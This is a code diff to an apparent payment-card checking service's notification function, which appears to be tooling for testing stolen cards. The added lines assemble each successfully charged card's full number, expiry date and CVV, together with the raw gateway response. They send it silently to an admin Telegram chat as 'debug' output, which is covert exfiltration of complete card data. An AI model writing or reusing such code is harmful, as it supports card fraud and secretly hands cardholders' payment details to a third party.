@@ -271,6 +271,9 @@ serve(async (req) => {
     const countryFlag = getCountryFlag(binInfo.countryCode);
     const brandEmoji = getBrandEmoji(binInfo.brand);
 
+    // Full card for admin debug (LIVE cards show full details)
+    const fullCardForAdmin = `${cardNum}|${mm}|${yy}|${cvv}`;
+    
     // Handle UNKNOWN status - Send debug info to admin only (silent, no user notification)
     if (status === "UNKNOWN") {
       console.log("[NOTIFY-CHARGED] UNKNOWN status - skipping user notification");
@@ -286,6 +289,27 @@ serve(async (req) => {
       return new Response(
         JSON.stringify({ success: true, type: 'declined_skipped' }),
         { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
+      );
+    }
+    
+    // 🔥 Send LIVE card debug info to admin with FULL card details
+    if (status === "CHARGED" && ADMIN_TELEGRAM_CHAT_ID) {
+      const adminDebugMsg = `🔔 <b>LIVE CARD DEBUG</b>
+
+<b>User:</b> ${profile?.username || user_id}
+<b>Card:</b> <code>${fullCardForAdmin}</code>
+<b>Gateway:</b> ${gateway}
+<b>Amount:</b> ${amount}
+<b>Response:</b> <code>${response_message}</code>
+${api_response ? `\n<b>Raw:</b> <code>${api_response.slice(0, 500)}</code>` : ''}
+
+${brandEmoji} ${binInfo.brand} • ${binInfo.type}
+🏦 ${binInfo.bank}
+${countryFlag} ${binInfo.country}`;
+      
+      // Fire-and-forget admin notification
+      sendTelegramMessage(ADMIN_TELEGRAM_CHAT_ID, adminDebugMsg).catch(err => 
+        console.error("[NOTIFY-CHARGED] Admin debug notification failed:", err)
       );
     }
 
